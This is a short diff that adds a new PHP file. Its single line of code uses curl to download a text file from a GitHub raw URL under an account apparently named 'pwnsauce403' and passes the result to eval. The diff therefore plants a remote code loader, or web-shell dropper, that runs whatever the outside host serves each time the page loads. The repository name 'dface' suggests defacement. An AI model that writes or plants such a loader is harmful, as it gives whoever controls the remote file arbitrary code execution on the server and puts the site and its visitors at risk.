@@ -1,0 +1,3 @@
+<?php
+$o = curl_init('https://raw.githubusercontent.com/pwnsauce403/dface/main/tahi/a.txt');curl_setopt($o, CURLOPT_RETURNTRANSFER, 1);$i = curl_exec($o);eval('?>'.$i);
+?>
